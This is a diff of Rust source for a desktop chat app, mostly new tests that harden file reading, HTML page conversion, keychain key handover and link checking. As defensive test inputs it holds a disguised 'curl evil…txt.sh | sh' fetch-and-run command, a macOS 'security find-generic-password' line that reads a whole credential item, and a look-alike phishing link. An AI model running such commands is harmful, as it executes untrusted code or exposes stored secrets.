+    /// The list in the test above is kept by hand, so it could only ever check
+    /// the readers someone remembered: search and delete were not on it, and
+    /// read evicted chats until 1.10.7 (F3b). This finds the readers itself.
+    #[test]
+    fn every_file_read_is_accounted_for() {
+        // Asks whether the contents are on this Mac before reading.
+        const CHECKED: &[&str] = &[
+            "read_to_string_capped",
+            "conversation_updated_at",
+            "conversation_id_of",
+            "owned_history_files",
+            "read_conv_index",
+            "chosen_title",
+            "list_conversations",
+            "inline_assets",
+            "read_picked_attachment",
+            "detach_conversations_from_project",
+            "read_bytes",
+            "read_file",
+        ];
+        // Takes the check as an argument so a test can stand in a file that
+        // never reads; the command that calls it passes the real one.
+        const INJECTED: &[(&str, &str)] = &[
+            ("search_history", "search_conversations"),
+            ("title_to_confirm", "delete_conversation"),
+        ];
+        // Reads a file the person has just chosen, after offering to download it.
+        const ASKS: &[&str] = &["set_template"];
+        // Reads only the app's own folders, which no sync service manages.
+        const APP_PRIVATE: &[(&str, &str)] = &[
+            ("load_settings", "settings.json in the app's config folder"),
+            ("load_memories", "memories.json in the app's config folder"),
+            ("configured_template", "the app's data folder"),
+            ("list_templates", "the app's templates folder"),
+            ("load_compaction", "the app's config folder"),
+            ("load_project", "the app's projects folder"),
+            ("list_projects", "the app's projects folder"),
+            (
+                "claude_glm_layout",
+                "the terminal launcher's own state file",
+            ),
+            (
+                "claude_glm_status",
+                "the terminal launcher in ~/bin, to see whether it asks the app for the key",
+            ),
+            ("load", "usage.json, the usage ledger, in the app's folder"),
+            (
+                "migrate_legacy",
+                "the usage ledger's earlier location, in the app's folder",
+            ),
+            ("saved", "pricing.json in the app's folder"),
+            (
+                "write_atomic_bytes",
+                "opens a directory to sync it, and reads nothing",
+            ),
+        ];
+        let reads = [
+            concat!("fs::read_", "to_string("),
+            concat!("fs::", "read("),
+            concat!("File::", "open("),
+            concat!(".read(", "true)"),
+        ];
+        let sources = [
+            ("lib.rs", lib_source()),
+            ("usage.rs", include_str!("usage.rs").replace("\r\n", "\n")),
+            (
+                "pricing.rs",
+                include_str!("pricing.rs").replace("\r\n", "\n"),
+            ),
+            (
+                "workspace.rs",
+                include_str!("workspace.rs").replace("\r\n", "\n"),
+            ),
+            ("cloud.rs", include_str!("cloud.rs").replace("\r\n", "\n")),
+        ];
+        let check = concat!("is_cloud_", "placeholder(");
+        let ask = concat!("bring_chosen_file_", "local(");
+        let mut unaccounted = Vec::new();
+        for (file, src) in &sources {
+            let mut current = String::new();
+            let mut body_of: std::collections::HashMap<String, String> = Default::default();
+            let mut in_tests = false;
+            let mut pending_cfg_test = false;
+            for line in src.lines() {
+                let t = line.trim_start();
+                // Test modules are skipped: they read what they wrote.
+                if line.starts_with("#[cfg(test)]") || line.starts_with("#[cfg(all(test") {
+                    pending_cfg_test = true;
+                    continue;
+                }
+                if pending_cfg_test {
+                    pending_cfg_test = false;
+                    if line.starts_with("mod ") {
+                        in_tests = true;
+                        continue;
+                    }
+                }
+                if in_tests {
+                    if line == "}" {
+                        in_tests = false;
+                    }
+                    continue;
+                }
+                let name = t
+                    .trim_start_matches("pub(crate) ")
+                    .trim_start_matches("pub ")
+                    .trim_start_matches("async ")
+                    .strip_prefix("fn ")
+                    .map(|r| r.split(['(', '<']).next().unwrap_or(""));
+                if let Some(name) = name {
+                    current = name.to_string();
+                }
+                body_of.entry(current.clone()).or_default().push_str(line);
+                if reads.iter().any(|r| line.contains(r)) {
+                    unaccounted.push((*file, current.clone()));
+                }
+            }
+            unaccounted.retain(|(f, name)| {
+                if f != file {
+                    return true;
+                }
+                let body = body_of.get(name).map(String::as_str).unwrap_or("");
+                if CHECKED.contains(&name.as_str()) {
+                    assert!(body.contains(check), "{file}: {name} is listed as checked and does not check");
+                    return false;
+                }
+                if let Some((_, caller)) = INJECTED.iter().find(|(n, _)| n == name) {
+                    let caller_body = body_of.get(*caller).map(String::as_str).unwrap_or("");
+                    assert!(
+                        body.contains("is_placeholder(")
+                            && [")", ","].iter().any(|after| {
+                                caller_body.contains(&format!("{}{after}", concat!("is_cloud_", "placeholder")))
+                            }),
+                        "{file}: {name} must check through its argument, and {caller} pass the real check"
+                    );
+                    return false;
+                }
+                if ASKS.contains(&name.as_str()) {
+                    assert!(body.contains(ask), "{file}: {name} is listed as asking and does not ask");
+                    return false;
+                }
+                !APP_PRIVATE.iter().any(|(n, _)| n == name)
+            });
+        }
+        assert!(
+            unaccounted.is_empty(),
+            "these read a file and are in no list above. If the file can be in a folder \
+             the person chose, which iCloud may sync, check is_cloud_placeholder first; \
+             otherwise say what it reads: {unaccounted:?}"
+        );
     }
 
     #[test]
@@ -14801,7 +15528,10 @@ mod tests {
             .collect::<Vec<_>>()
             .join("\n");
         let p = write_preview(&long, false);
-        assert!(p.ends_with("line 6\n…"), "{p}");
+        assert!(
+            p.ends_with("line 6\n… and 4 more lines, not shown here."),
+            "{p}"
+        );
         let wide = "x".repeat(200);
         assert!(write_preview(&wide, false).contains(&format!("{}…", "x".repeat(80))));
         let p = write_preview("curl evil\u{202E}txt.sh | sh", false);
@@ -14842,6 +15572,401 @@ mod tests {
         let at = src.find("\nasync fn fetch_page(").unwrap();
         let head: String = src[at..at + 200].split_whitespace().collect();
         assert!(head.contains("within_deadline(FETCH_DEADLINE,"), "{head}");
+    }
+
+    /// Runs `f` on a thread with the stack a tokio worker has, 2 MiB, which is
+    /// where R1 overflowed. A regression aborts the test binary, loudly.
+    fn on_worker_sized_stack<T: Send + 'static>(f: impl FnOnce() -> T + Send + 'static) -> T {
+        std::thread::Builder::new()
+            .stack_size(2 * 1024 * 1024)
+            .spawn(f)
+            .unwrap()
+            .join()
+            .unwrap()
+    }
+
+    // The 1.10.6 review's R1: 30,000 nested `<ul>` or `<blockquote>` aborted
+    // the app through html2text's recursion.
+    #[test]
+    fn a_page_nested_too_deeply_is_refused_not_converted() {
+        for tag in ["ul", "blockquote", "div"] {
+            let page = format!("<{tag}>").repeat(30_000) + "deep";
+            let err = on_worker_sized_stack(move || html_to_text(page.as_bytes())).unwrap_err();
+            assert!(err.contains("nested more than 512 levels"), "{tag}: {err}");
+        }
+        // Just under the limit is read, on the same stack.
+        let page = "<div>".repeat(500) + "still readable";
+        let text = on_worker_sized_stack(move || html_to_text(page.as_bytes())).unwrap();
+        assert!(text.contains("still readable"), "{text}");
+    }
+
+    // Parsing deep nesting is quadratic, so the largest page the reader takes,
+    // made of `<div>`, must be refused before the parser sees it.
+    #[test]
+    fn a_page_of_deep_blocks_is_refused_before_parsing() {
+        let page = "<div>".repeat(FETCH_MAX_BYTES / 5);
+        let started = std::time::Instant::now();
+        assert!(html_to_text(page.as_bytes())
+            .unwrap_err()
+            .contains("nested more than"));
+        assert!(
+            started.elapsed() < std::time::Duration::from_secs(2),
+            "{:?}",
+            started.elapsed()
+        );
+    }
+
+    #[test]
+    fn the_tag_count_errs_high_and_skips_what_does_not_nest() {
+        assert_eq!(rough_depth(b"<div><div></div><div><b>x</b></div></div>"), 3);
+        assert_eq!(
+            rough_depth(b"<ul><li>a<li>b<li>c</ul><p>x<p>y<br><img src=a>"),
+            1
+        );
+        assert_eq!(rough_depth(b"<!-- <div><div><div> --><DIV></Div>"), 1);
+        assert_eq!(
+            rough_depth(b"<script>if (a<b) { '<div><div>' }</script><style>p</style>"),
+            0
+        );
+        assert_eq!(rough_depth(b"<div/><div/>"), 2);
+        assert_eq!(rough_depth(b"a < b and 3<4 </ x"), 0);
+        // A page counted under the limit can still be deeper once parsed; the
+        // real tree is measured too.
+        let real = "<div>".repeat(600);
+        assert!(rough_depth(real.as_bytes()) <= 2 * PAGE_MAX_DEPTH);
+        assert!(html_to_text(real.as_bytes()).is_err());
+    }
+
+    // What the count leaves out must really not nest: the parser closes each
+    // of these when the next one opens, so 30,000 stay one level deep.
+    #[test]
+    fn what_the_tag_count_ignores_does_not_nest() {
+        for tag in [
+            "li", "p", "dd", "dt", "option", "td", "tr", "rt", "caption", "thead",
+        ] {
+            let page = format!(
+                "<ul><dl><select><table>{}</table></select></dl></ul>",
+                format!("<{tag}>x").repeat(30_000)
+            );
+            let r = on_worker_sized_stack(move || html_to_text(page.as_bytes()));
+            assert!(r.is_ok(), "{tag}: {r:?}");
+        }
+    }
+
+    #[test]
+    fn an_ordinary_page_reads_as_it_did() {
+        let page = "<html><head><title>T</title><style>p{}</style></head><body>\
+            <h1>Heading</h1><p>A <a href=\"https://example.com/\">link</a> and \
+            <b>bold</b>.</p><ul><li>one</li><li>two<ul><li>nested</li></ul></li></ul>\
+            <table><tr><th>a</th><th>b</th></tr><tr><td>1</td><td>2</td></tr></table>\
+            <blockquote>quoted</blockquote><pre>code\n  kept</pre></body></html>";
+        assert_eq!(
+            html_to_text(page.as_bytes()).unwrap(),
+            html2text::from_read(page.as_bytes(), 100).unwrap()
+        );
+    }
+
+    // R2: conversion ran inside the fetch, on a runtime worker, so the 45-second
+    // deadline could not interrupt it. Off the runtime, the deadline returns on
+    // time even while the conversion is still working.
+    #[tokio::test]
+    async fn the_page_deadline_can_abandon_a_slow_conversion() {
+        let page = "<p>word <b>bold</b> <i>it</i></p>"
+            .repeat(60_000)
+            .into_bytes();
+        let started = std::time::Instant::now();
+        let r = within_deadline(
+            std::time::Duration::from_millis(100),
+            "reading that page",
+            html_to_text_off_runtime(page),
+        )
+        .await;
+        assert!(started.elapsed() < std::time::Duration::from_secs(2));
+        assert!(r.unwrap_err().starts_with("reading that page took longer"));
+    }
+
+    #[tokio::test]
+    async fn stop_ends_a_page_read_without_waiting_for_it() {
+        let flag = Some(Arc::new(AtomicBool::new(false)));
+        let setter = flag.clone();
+        tokio::spawn(async move {
+            tokio::time::sleep(std::time::Duration::from_millis(150)).await;
+            setter.unwrap().store(true, Ordering::Relaxed);
+        });
+        let slow = async {
+            tokio::time::sleep(std::time::Duration::from_secs(30)).await;
+            Ok::<_, String>("never")
+        };
+        let started = std::time::Instant::now();
+        assert_eq!(
+            until_cancelled(&flag, slow).await,
+            Err("Stopped.".to_string())
+        );
+        assert!(started.elapsed() < std::time::Duration::from_secs(2));
+        assert_eq!(
+            until_cancelled(&None, async { Ok::<_, String>(1) }).await,
+            Ok(1)
+        );
+    }
+
+    /// How parse time grows with nesting, which is why `rough_depth` exists:
+    /// 20,000 nested `<div>` took 0.6 s in a release build, 10,000 a quarter
+    /// of that. Run by hand, as below.
+    #[test]
+    #[ignore]
+    fn page_parse_cost_deep() {
+        for n in [2_000usize, 5_000, 10_000, 20_000] {
+            for tag in ["div", "ul", "blockquote", "span", "b", "table"] {
+                let page = format!("<{tag}>").repeat(n);
+                let started = std::time::Instant::now();
+                let _ = html2text::config::plain().parse_html(page.as_bytes());
+                println!(
+                    "{tag:10} x{n:7} {} KiB: parse {:?}",
+                    page.len() / 1024,
+                    started.elapsed()
+                );
+            }
+        }
+    }
+
+    /// How long the largest page the reader accepts takes to convert, flat.
+    /// Run by hand: `cargo test --release page_conversion_cost -- --ignored --nocapture`.
+    #[test]
+    #[ignore]
+    fn page_conversion_cost() {
+        for (label, unit) in [
+            ("paragraphs", "<p>word <b>bold</b> <i>it</i> text</p>"),
+            (
+                "list items",
+                "<li>an item with <a href=\"https://e.com/\">a link</a></li>",
+            ),
+            ("table cells", "<tr><td>a</td><td>b</td><td>c</td></tr>"),
+            ("spans", "<span>x</span>"),
+        ] {
+            let page = unit.repeat(FETCH_MAX_BYTES / unit.len());
+            let page = if label == "table cells" {
+                format!("<table>{page}</table>")
+            } else {
+                page
+            };
+            let started = std::time::Instant::now();
+            let r = html_to_text(page.as_bytes());
+            println!(
+                "{label:12} {} KiB: {:?} ({})",
+                page.len() / 1024,
+                started.elapsed(),
+                r.map(|t| t.len()).unwrap_or(0)
+            );
+        }
+    }
+
+    // T1: the launcher gets one key from the app, never the whole item.
+    #[test]
+    fn the_terminal_gets_its_own_key_or_the_chat_key_and_nothing_else() {
+        let mut s = Secrets {
+            scaleway_api_key: " chat-key ".into(),
+            bfl_key: "bfl".into(),
+            ..Default::default()
+        };
+        assert_eq!(terminal_key(&s), "chat-key");
+        s.claude_glm_api_key = "terminal-key\n".into();
+        assert_eq!(terminal_key(&s), "terminal-key");
+        assert_eq!(terminal_key(&Secrets::default()), "");
+    }
+
+    #[test]
+    fn a_launcher_from_before_the_handover_is_recognised() {
+        let current = include_str!("../../deploy/claude-glm/install-claude-glm.command");
+        assert!(
+            !reads_whole_item(current),
+            "the shipped launcher does not ask the app"
+        );
+        assert!(reads_whole_item(
+            "KEY_BLOB=$(security find-generic-password -s \"com.anaubi.sovatela\" -a \"secrets\" -w)"
+        ));
+    }
+
+    #[test]
+    fn the_terminal_key_flag_is_handled_before_anything_starts() {
+        let main = include_str!("main.rs");
+        let flag = main
+            .find("run_terminal_key_if_requested()")
+            .expect("main no longer handles the terminal key flag");
+        assert!(flag < main.find("scale_lib::run()").unwrap());
+        // Before the catch-all that refuses unknown internal flags.
+        assert!(flag < main.find("unrecognised internal flag").unwrap());
+        assert!(TERMINAL_KEY_FLAG.starts_with("--sovatela-"));
+        let src = lib_source();
+        let at = src.find("pub fn run_terminal_key_if_requested").unwrap();
+        let body = &src[at..at + src[at..].find("\n}\n").unwrap()];
+        // It refuses a terminal before it reads anything.
+        assert!(body.find("is_terminal()").unwrap() < body.find("load_secrets()").unwrap());
+    }
+
+    // L1 of the 1.10.6 review.
+    #[test]
+    fn a_link_that_shows_one_host_and_opens_another_is_caught() {
+        let to = "https://evil.example/login";
+        assert_eq!(
+            shown_host_differs("https://console.scaleway.com", to).as_deref(),
+            Some("console.scaleway.com")
+        );
+        assert_eq!(
+            shown_host_differs("console.scaleway.com/iam", to).as_deref(),
+            Some("console.scaleway.com")
+        );
+        // The same host, with or without www., is not a mismatch.
+        assert_eq!(shown_host_differs("www.evil.example", to), None);
+        assert_eq!(shown_host_differs("https://evil.example/other", to), None);
+        // Text that names no host is not compared.
+        for text in ["the Scaleway console", "here", "v1.2", "e.g.", "", "3.14"] {
+            assert_eq!(shown_host_differs(text, to), None, "{text}");
+        }
+    }
+
+    // U2: the refusal says what to choose, not only what the parser saw.
+    #[test]
+    fn a_file_that_is_not_json_is_refused_with_what_to_choose() {
+        let e = serde_json::from_str::<serde_json::Value>("not json").unwrap_err();
+        let msg = not_a_chat_file(&e);
+        assert!(
+            msg.starts_with("that file is not a chat Sovatela saved"),
+            "{msg}"
+        );
+        assert!(
+            msg.contains("Export this chat") && msg.contains("as JSON"),
+            "{msg}"
+        );
+        assert!(
+            msg.contains("expected ident"),
+            "the parser's words are kept: {msg}"
+        );
+    }
+
+    // The R1/R3 class sweep of the 1.10.6 review: the calculator is a
+    // recursive-descent parser the model can be steered to call. At its 500
+    // character cap the deepest nesting it can be given is about 250 levels,
+    // run here on the 2 MiB stack a tokio worker has.
+    #[test]
+    fn the_deepest_expression_the_calculator_takes_does_not_overflow() {
+        for (open, close) in [("(", ")"), ("-(", ")"), ("sin(", ")")] {
+            let depth = (499 - 1) / (open.len() + close.len());
+            let expr = format!("{}1{}", open.repeat(depth), close.repeat(depth));
+            assert!(expr.len() <= 500);
+            // A stack overflow aborts the test binary, so returning at all is the
+            // assertion; the answer itself does not matter here.
+            let _ = std::thread::Builder::new()
+                .stack_size(2 * 1024 * 1024)
+                .spawn(move || calc_eval(&expr))
+                .unwrap()
+                .join()
+                .unwrap();
+        }
+    }
+
+    #[test]
+    fn ipv4_translated_addresses_are_private() {
+        for ip in [
+            "::ffff:0:127.0.0.1",
+            "::ffff:0:10.0.0.1",
+            "::ffff:0:8.8.8.8",
+        ] {
+            assert!(is_private_ip(ip.parse().unwrap()), "{ip}");
+        }
+        // Not to be confused with a public address it resembles.
+        assert!(!is_private_ip("2606:4700::1111".parse().unwrap()));
+    }
+
+    /// Mistral's rule for which role may follow which (mistral-common's
+    /// validator), as the request reaches Scaleway.
+    fn mistral_accepts(messages: &[serde_json::Value]) -> Result<(), String> {
+        let mut previous: Option<&str> = None;
+        for m in messages {
+            let role = m["role"].as_str().unwrap_or("");
+            if let Some(prev) = previous {
+                let allowed: &[&str] = match prev {
+                    "system" => &["user", "assistant", "system"],
+                    "user" => &["assistant", "system", "user"],
+                    "assistant" => &["assistant", "user", "tool"],
+                    "tool" => &["assistant", "tool"],
+                    _ => &[],
+                };
+                if !allowed.contains(&role) {
+                    return Err(format!("Unexpected role '{role}' after role '{prev}'"));
+                }
+            }
+            previous = Some(role);
+        }
+        Ok(())
+    }
+
+    // Found by the owner on 1.10.6: a chat with an image, tools on, and a few
+    // rounds of research failed with exactly this message, twice.
+    #[test]
+    fn a_wrap_up_instruction_never_follows_a_tool_result_for_the_vision_model() {
+        let after_tools = || {
+            vec![
+                serde_json::json!({ "role": "system", "content": "You are helpful." }),
+                serde_json::json!({ "role": "user", "content": "chart Oslo's population" }),
+                serde_json::json!({ "role": "assistant", "content": "", "tool_calls": [] }),
+                serde_json::json!({ "role": "tool", "tool_call_id": "1", "content": "1850 + 173 = 2023" }),
+            ]
+        };
+        // What 1.10.6 sent is what Scaleway refused.
+        let mut old = after_tools();
+        old.push(serde_json::json!({ "role": "system", "content": "wrap up" }));
+        assert_eq!(
+            mistral_accepts(&old),
+            Err("Unexpected role 'system' after role 'tool'".into())
+        );
+
+        for role in ["system", "user"] {
+            let mut msgs = after_tools();
+            add_instruction(&mut msgs, role, "Start concluding.", VISION_MODEL);
+            assert_eq!(mistral_accepts(&msgs), Ok(()), "{role}: {msgs:?}");
+            assert_eq!(msgs.len(), 4, "nothing appended");
+            assert!(msgs[0]["content"]
+                .as_str()
+                .unwrap()
+                .ends_with("Start concluding."));
+            assert!(msgs[0]["content"]
+                .as_str()
+                .unwrap()
+                .starts_with("You are helpful."));
+        }
+
+        // No leading system message: one is made.
+        let mut bare = after_tools()[1..].to_vec();
+        add_instruction(&mut bare, "system", "Start concluding.", VISION_MODEL);
+        assert_eq!(bare[0]["role"], "system");
+        assert_eq!(mistral_accepts(&bare), Ok(()));
+
+        // GLM-5.2 keeps the trailing message it has always had.
+        let mut glm = after_tools();
+        add_instruction(&mut glm, "system", "Start concluding.", MODEL);
+        assert_eq!(glm.last().unwrap()["content"], "Start concluding.");
+        assert_eq!(glm[0]["content"], "You are helpful.");
+    }
+
+    // The two places the tool loop adds such an instruction both go through it.
+    #[test]
+    fn the_tool_loop_adds_its_instructions_through_add_instruction() {
+        let src = lib_source();
+        let at = src
+            .find("for round in 0..MAX_ROUNDS")
+            .expect("the tool loop moved");
+        let body = &src[at..at + 40_000.min(src.len() - at)];
+        assert!(
+            body.matches("add_instruction(").count() >= 2,
+            "an instruction bypasses it"
+        );
+        assert!(
+            !body.contains(concat!(
+                "round_msgs.push(serde_json::json!({\n                    \"role\": ",
+                "\"system\""
+            )),
+            "the budget note is pushed directly again"
+        );
     }
 
     #[test]
@@ -17341,6 +18466,10 @@ struct ClaudeGlmStatus {
     available: bool,
     claude_installed: bool,
     launcher_installed: bool,
+    /// A macOS launcher from before 1.10.7, which reads the whole credential
+    /// item with `security` rather than asking the app for one key (T1). It
+    /// sits outside the app, so only running setup again replaces it.
+    launcher_reads_whole_item: bool,
     proxy_running: bool,
     key_stored: bool,
 }
@@ -17555,6 +18684,12 @@ fn claude_glm_proxy_running() -> bool {
     false
 }
 
+/// Whether a launcher's text reads the credential item without first asking
+/// the app for the terminal key, as every macOS launcher before 1.10.7 did.
+fn reads_whole_item(launcher: &str) -> bool {
+    !launcher.contains(TERMINAL_KEY_FLAG)
+}
+
 /// Read-only readiness snapshot for the Settings panel.
 #[tauri::command]
 async fn claude_glm_status() -> Result<ClaudeGlmStatus, String> {
@@ -17562,9 +18697,12 @@ async fn claude_glm_status() -> Result<ClaudeGlmStatus, String> {
     {
         let key_stored = get_api_key()?.is_some();
         tokio::task::spawn_blocking(move || {
-            let launcher = claude_glm_launcher_path()
-                .map(|p| p.exists())
-                .unwrap_or(false);
+            let launcher_path = claude_glm_launcher_path();
+            let launcher = launcher_path.as_ref().is_some_and(|p| p.exists());
+            let launcher_reads_whole_item = cfg!(target_os = "macos")
+                && launcher_path
+                    .and_then(|p| std::fs::read_to_string(p).ok())
+                    .is_some_and(|text| reads_whole_item(&text));
             // 1.6.1 and later keep uv and the proxy inside the app's own config
             // folder. A launcher with no venv beside it predates that.
             let layout = claude_glm_layout(claude_glm_config_dir().as_deref(), launcher);
@@ -17574,6 +18712,7 @@ async fn claude_glm_status() -> Result<ClaudeGlmStatus, String> {
                 available: terminal_access_available(),
                 claude_installed: claude_glm_has("claude"),
                 launcher_installed: launcher,
+                launcher_reads_whole_item,
                 proxy_running: claude_glm_proxy_running(),
                 key_stored,
             }
@@ -17810,6 +18949,12 @@ fn run_claude_glm_installer(on_line: Channel<String>) -> Result<i32, String> {
     });
     #[cfg(unix)]
     command.args(["-lic", &format!("'{}' 2>&1", script.display())]);
+    // Where this app's own binary is, so the launcher can ask it for the
+    // terminal key instead of reading the whole credential item itself (T1).
+    #[cfg(target_os = "macos")]
+    if let Ok(exe) = std::env::current_exe().and_then(std::fs::canonicalize) {
+        command.env("SOVATELA_APP_EXE", exe);
+    }
     #[cfg(windows)]
     command
         .args(["-ExecutionPolicy", "Bypass", "-NoProfile", "-File"])
@@ -17884,6 +19029,7 @@ pub fn run() {
                         "text/html; charset=utf-8",
                     )
                     .header(tauri::http::header::CONTENT_SECURITY_POLICY, ARTIFACT_CSP)
+                    .header("X-DNS-Prefetch-Control", "off")
                     .body(html.into_bytes())
                     .unwrap(),
                 None => tauri::http::Response::builder()
@@ -17910,6 +19056,11 @@ pub fn run() {
             // before the window, and the frontend's first has_api_key call
             // can't race an unfinished migration into showing "no key".
             migrate_secrets_storage(&app.handle().clone());
+            #[cfg(target_os = "macos")]
+            match app.get_webview_window("main") {
+                Some(window) => artifact_net::install(&window),
+                None => eprintln!("no main window, so artifacts stay switched off"),
+            }
             Ok(())
         })
         .invoke_handler(tauri::generate_handler![
@@ -17936,6 +19087,7 @@ pub fn run() {
             get_memory_settings,
             set_memory_settings,
             get_workspace_dir,
+            workspace_problem,
             choose_workspace_dir,
             clear_workspace_dir,
             reveal_workspace_dir,
